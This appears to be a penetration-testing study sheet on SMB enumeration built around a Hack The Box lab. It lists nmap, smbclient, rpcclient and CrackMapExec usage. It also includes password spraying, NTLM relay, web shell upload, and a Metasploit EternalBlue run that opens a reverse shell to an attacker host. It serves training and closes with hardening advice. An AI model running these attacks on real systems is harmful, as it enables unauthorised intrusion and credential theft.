# SMB (Server Message Block) Enumeration

## Protocol Overview

**SMB Characteristics:**
- **Ports**: 139 (NetBIOS), 445 (Direct SMB)
- **Protocol**: TCP-based
- **Purpose**: File/printer sharing, network resource access
- **Implementation**: Windows (native), Linux (Samba)

**SMB Versions:**

| Version | Supported OS | Key Features |
|---------|-------------|--------------|
| **CIFS/SMB 1.0** | Windows NT 4.0/2000 | NetBIOS interface, Direct TCP |
| **SMB 2.0** | Windows Vista/2008 | Performance upgrades, message signing |
| **SMB 2.1** | Windows 7/2008 R2 | Locking mechanisms |
| **SMB 3.0** | Windows 8/2012 | Multichannel, end-to-end encryption |
| **SMB 3.1.1** | Windows 10/2016 | AES-128 encryption, integrity checking |

**Samba Implementation:**
- **Purpose**: SMB/CIFS implementation for Unix-based systems
- **Components**: smbd (SMB daemon), nmbd (NetBIOS daemon)
- **Active Directory**: Full domain controller capabilities (v4+)

## Common SMB Configurations

### Samba Configuration File
```bash
# Main configuration file
cat /etc/samba/smb.conf | grep -v "#\|\;"

[global]
   workgroup = DEV.INFREIGHT.HTB
   server string = DEVSMB
   log file = /var/log/samba/log.%m
   max log size = 1000
   server role = standalone server
   map to guest = bad user
   usershare allow guests = yes

[printers]
   comment = All Printers
   browseable = no
   path = /var/spool/samba
   printable = yes
   guest ok = no

[notes]
   comment = CheckIT
   path = /mnt/notes/
   browseable = yes
   read only = no
   writable = yes
   guest ok = yes
```

### Key Configuration Settings

| Setting | Description | Security Impact |
|---------|-------------|-----------------|
| `[sharename]` | Network share name | Enumeration target |
| `workgroup = WORKGROUP` | Workgroup/domain name | Domain information |
| `path = /path/here/` | Directory path | File system access |
| `server string = STRING` | Banner information | Information disclosure |
| `usershare allow guests = yes` | Guest access | Anonymous enumeration |
| `map to guest = bad user` | Invalid user handling | Authentication bypass |
| `browseable = yes` | Share visibility | Share enumeration |
| `guest ok = yes` | Anonymous access | Unauthenticated access |
| `read only = no` | Write permissions | File upload capability |
| `writable = yes` | Write access | Malicious file upload |

## Dangerous SMB Settings

### High-Risk Configurations
```bash
browseable = yes              # Allow share listing
read only = no               # Enable write access
writable = yes               # Allow file modification
guest ok = yes               # Anonymous access
enable privileges = yes      # Honor SID privileges
create mask = 0777           # Full permissions for new files
directory mask = 0777        # Full permissions for directories
logon script = script.sh     # Login script execution
magic script = script.sh     # Script on connection close
magic output = script.out    # Script output location
```

## SMB Enumeration Techniques

### 1. Nmap SMB Scanning

**Basic SMB Scan:**
```bash
# Standard SMB scan
sudo nmap -sV -sC -p139,445 target_ip

# SMB-specific scripts
sudo nmap -p445 --script smb-* target_ip
```

**Available Nmap SMB Scripts:**
```bash
# Find SMB scripts
find / -name "*smb*" 2>/dev/null | grep scripts

smb-enum-domains.nse           # Domain enumeration
smb-enum-groups.nse            # Group enumeration  
smb-enum-processes.nse         # Process enumeration
smb-enum-sessions.nse          # Session enumeration
smb-enum-shares.nse            # Share enumeration
smb-enum-users.nse             # User enumeration
smb-os-discovery.nse           # OS information
smb-protocols.nse              # Protocol versions
smb-security-mode.nse          # Security settings
smb-server-stats.nse           # Server statistics
smb-system-info.nse            # System information
smb-vuln-*.nse                 # Vulnerability checks
```

**Example Nmap Output:**
```bash
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2

Host script results:
|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown>
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-19T13:16:04
|_  start_date: N/A
```

### 2. SMBclient Enumeration

**Share Listing:**
```bash
# List shares with null session
smbclient -N -L //target_ip

# Connect to specific share
smbclient //target_ip/sharename

# Anonymous connection
smbclient -N //target_ip/sharename
```

**SMBclient Commands:**
```bash
# Directory operations
smb: \> ls                    # List directory contents
smb: \> cd directory          # Change directory
smb: \> pwd                   # Current directory
smb: \> mkdir newdir          # Create directory

# File operations  
smb: \> get filename          # Download file
smb: \> put localfile         # Upload file
smb: \> mget *.txt           # Download multiple files
smb: \> del filename          # Delete file

# System commands
smb: \> !ls                   # Execute local command
smb: \> help                  # List available commands
```

**Example SMBclient Session:**
```bash
smbclient //10.129.14.128/notes
Enter WORKGROUP\username's password: 
Anonymous login successful

smb: \> ls
  .                                   D        0  Wed Sep 22 18:17:51 2021
  ..                                  D        0  Wed Sep 22 12:03:59 2021
  prep-prod.txt                       N       71  Sun Sep 19 15:45:21 2021

smb: \> get prep-prod.txt
getting file \prep-prod.txt of size 71 as prep-prod.txt (8.7 KiloBytes/sec)

smb: \> !cat prep-prod.txt
[] check your code with the templates
[] run code-assessment.py
```

### 3. RPCclient Enumeration

**RPC Connection:**
```bash
# Connect with null session
rpcclient -U "" target_ip
rpcclient -N target_ip

# Alternative authentication
rpcclient -U "username" target_ip
```

**RPCclient Commands:**

| Command | Description |
|---------|-------------|
| `srvinfo` | Server information |
| `enumdomains` | Enumerate domains |
| `querydominfo` | Domain information |
| `netshareenumall` | List all shares |
| `netsharegetinfo <share>` | Share information |
| `enumdomusers` | Enumerate domain users |
| `queryuser <RID>` | User information |
| `enumdomgroups` | Enumerate groups |
| `querygroup <RID>` | Group information |

**Example RPCclient Session:**
```bash
rpcclient $> srvinfo
        DEVSMB         Wk Sv PrQ Unx NT SNT DEVSM
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

rpcclient $> enumdomains
name:[DEVSMB] idx:[0x0]
name:[Builtin] idx:[0x1]

rpcclient $> netshareenumall
netname: notes
        remark: CheckIT
        path:   C:\mnt\notes\
        password:

rpcclient $> enumdomusers
user:[mrb3n] rid:[0x3e8]
user:[cry0l1t3] rid:[0x3e9]

rpcclient $> queryuser 0x3e9
        User Name   :   cry0l1t3
        Full Name   :   cry0l1t3
        Home Drive  :   \\devsmb\cry0l1t3
        Profile Path:   \\devsmb\cry0l1t3\profile
        Password last set Time   :      Mi, 22 Sep 2021 17:50:56 CEST
```

### 4. User RID Brute Forcing

**Bash RID Enumeration:**
```bash
# Brute force RIDs 500-1100
for i in $(seq 500 1100);do 
    rpcclient -N -U "" target_ip -c "queryuser 0x$(printf '%x\n' $i)" | 
    grep "User Name\|user_rid\|group_rid" && echo ""
done

# Results:
        User Name   :   sambauser
        user_rid :      0x1f5
        group_rid:      0x201
		
        User Name   :   mrb3n
        user_rid :      0x3e8
        group_rid:      0x201
```

**Impacket samrdump.py:**
```bash
# Automated user enumeration
samrdump.py target_ip

# Example output:
Found user: mrb3n, uid = 1000
Found user: cry0l1t3, uid = 1001
mrb3n (1000)/FullName: 
mrb3n (1000)/PasswordLastSet: 2021-09-22 17:47:59
cry0l1t3 (1001)/FullName: cry0l1t3
cry0l1t3 (1001)/PasswordLastSet: 2021-09-22 17:50:56
```

### 5. Advanced SMB Tools

**SMBMap:**
```bash
# Basic share enumeration
smbmap -H target_ip

# With credentials
smbmap -H target_ip -u username -p password

# Recursive directory listing
smbmap -H target_ip -R

# Example output:
[+] IP: 10.129.14.128:445       Name: 10.129.14.128                                     
        Disk                                    Permissions     Comment
        ----                                    -----------     -------
        print$                                  NO ACCESS       Printer Drivers
        home                                    NO ACCESS       INFREIGHT Samba
        dev                                     NO ACCESS       DEVenv
        notes                                   READ,WRITE      CheckIT
        IPC$                                    NO ACCESS       IPC Service (DEVSM)
```

**CrackMapExec:**
```bash
# Share enumeration
crackmapexec smb target_ip --shares -u '' -p ''

# User enumeration  
crackmapexec smb target_ip -u '' -p '' --users

# Password spraying
crackmapexec smb target_ip -u users.txt -p passwords.txt

# Example output:
SMB         10.129.14.128   445    DEVSMB    [+] Enumerated shares
SMB         10.129.14.128   445    DEVSMB    Share           Permissions     Remark
SMB         10.129.14.128   445    DEVSMB    notes           READ,WRITE      CheckIT
```

**Enum4Linux-ng:**
```bash
# Installation
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
pip3 install -r requirements.txt

# Comprehensive enumeration
./enum4linux-ng.py target_ip -A

# Specific enumeration
./enum4linux-ng.py target_ip -U  # Users
./enum4linux-ng.py target_ip -S  # Shares
./enum4linux-ng.py target_ip -G  # Groups
```

## SMB Security Issues

### 1. Anonymous Access
- **Risk**: Unauthorized share access and information disclosure
- **Detection**: Null session connections
- **Exploitation**: Data theft, user enumeration

### 2. Weak Authentication
- **Risk**: Credential-based attacks
- **Detection**: Password spraying, brute force
- **Exploitation**: Account compromise

### 3. Excessive Share Permissions
- **Risk**: Unauthorized file access/modification
- **Detection**: Permission enumeration
- **Exploitation**: Data manipulation, malware deployment

### 4. Information Disclosure
- **Risk**: Sensitive data exposure
- **Detection**: Share browsing, file enumeration
- **Exploitation**: Intelligence gathering

## SMB Attack Vectors

### 1. Share Exploitation
```bash
# File upload for web shells
smbclient //target/webshare
smb: \> put shell.php

# Configuration file access
smbclient //target/config
smb: \> get database.conf
```

### 2. Password Attacks
```bash
# Hydra SMB brute force
hydra -l user -P passwords.txt smb://target_ip

# CrackMapExec password spraying
crackmapexec smb target_ip -u users.txt -p 'Password123!'
```

### 3. Relay Attacks
```bash
# SMB relay with Responder
responder -I eth0 -A

# ntlmrelayx.py for relay attacks
ntlmrelayx.py -tf targets.txt -smb2support
```

## Common Vulnerabilities

### Critical SMB CVEs

| CVE | Name | Impact | Affected Versions |
|-----|------|--------|------------------|
| **CVE-2017-0144** | EternalBlue | Remote Code Execution | Windows Vista - Windows 10, Server 2008-2016 |
| **CVE-2020-0796** | SMBGhost (CoronaBlue) | Remote Code Execution | Windows 10 v1903/v1909, Server v1903/v1909 |
| **CVE-2017-7494** | SambaCry | Remote Code Execution | Samba 3.5.0 - 4.6.4/4.5.10/4.4.14 |
| **CVE-2016-2118** | Badlock | Man-in-the-Middle | Windows/Samba NTLM authentication |
| **CVE-2017-12149** | SMBLoris | Denial of Service | Windows SMB implementations |

### EternalBlue (CVE-2017-0144)
```bash
# Nmap EternalBlue detection
nmap -p445 --script smb-vuln-ms17-010 target

# Metasploit exploitation
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set payload windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
exploit

# Manual verification
python checker.py target 445
```

### SMBGhost (CVE-2020-0796)
```bash
# Detection script
nmap -p445 --script smb-vuln-cve2020-0796 target

# Proof of concept
python3 cve-2020-0796.py target

# Metasploit module
use auxiliary/scanner/smb/smb_ms20_004
set RHOSTS target
run
```

### SambaCry (CVE-2017-7494)
```bash
# Vulnerability detection
nmap -p445 --script smb-vuln-cve2017-7494 target

# Manual check
smbclient //target/share -N
smb: \> allinfo /path/to/shared/library.so

# Exploitation requirements:
# - Samba version 3.5.0+
# - File upload to SMB share
# - Knowledge of share path on server
```

### Badlock (CVE-2016-2118)
```bash
# NTLM authentication weaknesses
# Man-in-the-middle attacks on SMB authentication
# Affects both Windows and Samba implementations

# Detection
enum4linux-ng.py target -A | grep -i "signing"
rpcclient -N target -c "getdcname"
```

### Additional SMB Vulnerabilities
- **CVE-2008-4250**: MS08-067 Conficker vulnerability
- **CVE-2017-0145**: EternalBlue variant (MS17-010)
- **CVE-2017-0146**: EternalBlue variant (MS17-010)
- **CVE-2019-0708**: BlueKeep (RDP, but often found with SMB)
- **CVE-2020-1472**: Zerologon (NetLogon, SMB-related)

### Vulnerability Scanning
```bash
# Comprehensive SMB vulnerability scan
nmap -p445 --script smb-vuln-* target

# Specific vulnerability checks
nmap -p445 --script smb-vuln-ms17-010 target        # EternalBlue
nmap -p445 --script smb-vuln-cve2020-0796 target    # SMBGhost
nmap -p445 --script smb-vuln-cve2017-7494 target    # SambaCry

# Metasploit auxiliary scanners
use auxiliary/scanner/smb/smb_ms17_010              # EternalBlue scanner
use auxiliary/scanner/smb/smb_ms20_004              # SMBGhost scanner
```

## SMB Enumeration Checklist

### Initial Reconnaissance
- [ ] Port scanning (139, 445)
- [ ] SMB version identification
- [ ] NetBIOS name enumeration
- [ ] Null session testing

### Share Enumeration
- [ ] Share listing and access testing
- [ ] Permission analysis
- [ ] File and directory enumeration
- [ ] Sensitive file discovery

### User Enumeration
- [ ] RID cycling for user discovery
- [ ] User information gathering
- [ ] Group membership analysis
- [ ] Password policy enumeration

### Authentication Testing
- [ ] Anonymous access testing
- [ ] Default credential testing
- [ ] Password spraying
- [ ] Brute force attacks

### Advanced Testing
- [ ] SMB relay attack testing
- [ ] Vulnerability scanning
- [ ] Configuration analysis
- [ ] Privilege escalation vectors

## Tools for SMB Enumeration

### Built-in Tools
```bash
# SMB client
smbclient -L //target_ip

# RPC client
rpcclient -U "" target_ip

# NetBIOS enumeration
nmblookup -A target_ip
```

### Specialized Tools
```bash
# SMBMap
smbmap -H target_ip

# CrackMapExec
crackmapexec smb target_ip --shares

# Enum4Linux-ng
enum4linux-ng.py target_ip -A

# Impacket tools
samrdump.py target_ip
smbexec.py domain/user:pass@target_ip
```

### Nmap Scripts
```bash
# Comprehensive SMB scan
nmap -p445 --script smb-enum-*,smb-vuln-*,smb-os-discovery target_ip
```

## Defensive Measures

### SMB Server Hardening
- **Disable SMBv1** - Use SMBv2/v3 only
- **Restrict anonymous access** - Disable null sessions
- **Implement strong authentication** - Kerberos, NTLM restrictions
- **Use share-level permissions** - Principle of least privilege
- **Enable message signing** - Prevent tampering
- **Regular security updates** - Patch known vulnerabilities

### Network Security
- **Firewall restrictions** - Block SMB ports externally
- **Network segmentation** - Isolate file servers
- **Monitor SMB traffic** - Detect anomalies
- **Implement SMB over VPN** - Secure remote access 